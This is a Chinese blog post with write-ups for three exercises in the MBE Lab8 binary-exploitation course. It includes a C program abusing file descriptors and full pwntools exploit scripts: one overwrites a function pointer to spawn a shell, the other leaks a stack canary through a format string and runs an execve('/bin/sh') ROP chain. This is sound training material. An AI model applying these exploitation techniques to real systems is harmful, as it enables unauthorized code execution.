---
layout: post
title: "MBE Lab8 Misc and Canaries Write Up"
---

# 0x00 背景

此篇write up对应于MBE的Lab8，相关的内容是整数溢出，文件描述符利用和Stack Cookies的绕过，虽然是很杂的知识没有之前的那么有挑战性，但了解与掌握还是有必要的。 

<!-- more -->

# 0x01 Lab8

## Lab8C

此题保护全开,看来看去感觉没什么问题,源码的意思应该是获得.pass文件的内容就可以了。有想过借助lseek的返回结构造成整数溢出绕过判断,再借助%s泄露出.pass，但其返回值也是有符号的。最后注意到，程序的保护只是针对于文件名的，如果传递的是.pass的文件描述符就还是会输出其内容。那么我写一个小程序打开.pass得到fd再传递给lab8C也是可以的（子进程继承父进程fd）：

```c
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>

int main()
{
    int fd;
    char lab8C[32];

    fd = open(".pass", O_RDONLY);
    printf(".pass fd is %d\n", fd);
    sprintf(lab8C, "./lab8C -fd=%d -fd=%d", fd, fd);
    system(lab8C);
    return 0;
}
```

是不是有些耍赖，但还有一点就是在打开.pass文件后其fd就是3，所以我们直接传递参数也是可解的（fd是递增的）：

![][1]

## Lab8B

此题只要是劫持eip至thisIsASecret函数就可以获取shell了，很明显是要覆盖vector结构体中的函数指针，虽然是PIE编译但有printVector的操作也算是自动泄露地址了。不难发现漏洞位于fave函数：

```c
	else
	{
		faves[i] = malloc(sizeof(struct vector));
		memcpy(faves[i], (int*)(&v3)+i, sizeof(struct vector));
		printf("I see you added that vector to your favorites, \
but was it really your favorite?\n");
	}
```

拷贝加偏移简直不要太明显，所以通过构造特定的vector，fave函数先将其拷贝至全局结构体指针数组的结构体中，再由loadFave拷贝至v1中覆盖函数指针就好了。另外还需要注意三个小问题：

1. vector结构体中保存着不同的数据类型，所以存在内存对齐的问题，这一点通过反汇编也可以表现出来：

![][2]

2. 程序中getchar和scanf保存在内存中的数值是有所区别的，不禁想起了初学C语言的时候。

![][3]

3. 由于缓冲区的问题，在使用pwntools的时候输入输出不容易对上，而且在直接调用`gdb.attach`时也是无法调试，想了一个小办法，在需要调试的地方直接`time.sleep(1000)`，再外部开gdb attach就可以了。

这个题目虽然有些无聊，但还是要有利用代码的：

```python
from pwn import *
import time

context.log_level = 'debug'
p = process('./lab8B')
p.sendline('1')
p.sendline('1')
for _ in xrange(9):
    p.sendline('1')

p.sendline('3')
p.sendline('1')
tmp = p.recvregex('printFunc: .*?\n')
printVector_addr = int(tmp.strip().split(' ')[-1], 16)
printVector_offset = 0xe19
thisIsASecret_offset = 0xdd7
thisIsASecret_addr = printVector_addr-(printVector_offset-thisIsASecret_offset)
thisIsASecret_hex = p32(thisIsASecret_addr)
print repr(thisIsASecret_hex.encode('hex'))

p.sendline('1')
p.sendline('2')
p.sendline('1')
p.sendline('1')
p.sendline('1')
p.sendline(str(thisIsASecret_addr-1))
for _ in xrange(5):
    p.sendline('1')

p.sendline('2')
#time.sleep(10000)
p.sendline('4')
p.sendline('4')
p.sendline('4')
p.sendline('4')

p.sendline('6')
p.sendline('3')
p.sendline('1')
#time.sleep(10000)
p.sendline('3')
p.sendline('1')
p.interactive()
```

效果如下：

![][4]

## Lab8A

此题终于是个对栈保护canary的绕过，由于是静态编译所以还是要构造ROP链。在selectABook函数中故意printf出接收的buf_secure，借助此格式化漏洞即可泄露出栈上的random canary。另外虽然在findSomeWords函数中有自定义的cookie保护，但其要求是将`buf[-8:-4]`设为0xdeadbeef就可以了，最后read函数直接造成栈溢出即可利用：

```python
from pwn import *

context.log_level = 'debug'
p = process('./lab8A')
p.sendlineafter('Name: ', '%130$08x')
xor_select_val = int('0x'+p.recvline().strip(), 16)
ret_select_val = 0x080491ba
canary = xor_select_val ^ ret_select_val
p.sendlineafter('book.', '%1$08x/bin//sh')
buf_secure_addr = int('0x'+p.recvline().strip()[-16:-8], 16)
#gdb.attach(p)
p.sendlineafter('book.', 'A')

rop = 0x08054980 # xor eax, eax; ret
xor_find_val = xor_select_val  # rop ^ canary

padding = 'A'*16+p32(0xdeadbeef)+'A'*4+p32(xor_find_val)+'A'*4
rop = p32(rop)
rop += p32(0x0806f0a0) # pop edx; pop ecx; pop ebx; ret
rop += p32(0)
rop += p32(0)
rop += p32(buf_secure_addr+6)
for _ in xrange(11):
    rop += p32(0x080e927f)
rop += p32(0x0806f750)

rop += p32(0x08054980)
rop += p32(0x080e927f)
rop += p32(0x0806f750)
p.sendlineafter('==  ', padding+rop)
p.interactive()
```

其中有两点需要注意：

1. ebx保存字符串/bin/sh指针的问题，这里我借助了printf的字符串格式化漏洞直接泄露出在使用scanf函数过程中栈上保存的buf_secure地址。
2. ROP中直接调用的是execve系统调用，当传入的参数为`/bin/sh;%1$08x`时系统调用总会出错，这里误以为是和shell一样加个分号就没事了，事实上在调用时应该直接传入/bin/sh才不会出错。

效果如下：

![][5]

# 0x02 总结

绕过Canary的方法当然不止信息泄露，其他方法可见[Canary](http://tacxingxing.com/2017/07/13/canary/)，问题不断，菜鸡的代码书写还是需要加强呀。

[1]: https://wx1.sinaimg.cn/large/ee2fecafgy1fpthfrtgpgj20q1030gly.jpg
[2]: https://wx2.sinaimg.cn/large/ee2fecafgy1fpthfsb1qej20jc07j3zz.jpg
[3]: https://wx3.sinaimg.cn/large/ee2fecafgy1fpthfsq8wej20oo044gm4.jpg
[4]: https://wx1.sinaimg.cn/large/ee2fecafgy1fpthft7q7uj20pz071aav.jpg
[5]: https://wx1.sinaimg.cn/large/ee2fecafgy1fpthftrhs8j20q20a1abi.jpg
